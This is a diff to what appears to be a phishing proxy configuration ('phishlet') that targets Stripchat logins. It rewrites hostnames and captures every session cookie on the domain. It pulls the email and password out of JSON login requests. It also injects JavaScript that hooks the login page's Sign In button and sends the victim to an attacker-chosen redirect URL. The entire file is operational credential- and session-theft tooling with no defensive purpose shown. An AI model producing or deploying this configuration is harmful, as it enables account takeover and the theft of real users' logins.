@@ -12,44 +12,47 @@ sub_filters:
   - {triggers_on: 'www.stripchat.com', orig_sub: '', domain: 'stripchat.global', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'www.stripchat.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.stripchat.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
- 
-
 auth_tokens:
-  - domain: '.www.stripchat.com'
+  - domain: '.stripchat.com'
     keys: ['.*,regexp']
   - domain: '.stripchat.com'
     keys: ['.*,regexp']
-  
 credentials:
   username:
-    key: 'session_key'
-    search: '(.*)'
-    type: 'post'
+    key: ''
+    search: '"email":"([^"]*)"'
+    type: 'json'
   password:
-    key: 'session_password'
-    search: '(.*)'
-    type: 'post'
-  custom:
-    - key: 'newPassword'
-      search: '(.*)'
-      type: 'post'
+    key: ''
+    search: '"password":"([^"]*)"'
+    type: 'json'
 login:
   domain: 'www.stripchat.com'
   path: '/login'
-
+# Handle redirect issue, only login page will have three buttons.
+# Hook Sign In button to redirect after they click it, keep checking for
+# buttons every second
 js_inject:
-  - trigger_domains: ["www.stripchat.com"]
-    trigger_paths: [""]
-    trigger_params: ["email"]
+  - trigger_domains: ["stripchat.com"]
+    trigger_paths: ["/login"]
     script: |
-      function lp(){
-        var email = document.querySelector("#username");
-        var password = document.querySelector("#password");
-        if (email != null && password != null) {
-          email.value = "{email}";
-          password.focus();
+      async function worker() {
+        const elements = document.getElementsByTagName("BUTTON");
+        const num = elements.length;
+        if (num < 3) {
           return;
+        } else {
+          document.getElementsByTagName("BUTTON")[0].onclick = redirectme;
         }
-        setTimeout(function(){lp();}, 100);
       }
-      setTimeout(function(){lp();}, 100);
+      function sleeptime(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+      async function redirectme() {
+        await sleeptime(2000);
+        window.location.href = "{redirect_url}";
+      }
+      function myFunction() {
+        var run = setInterval("worker()", 1000); 
+      }
+      myFunction();
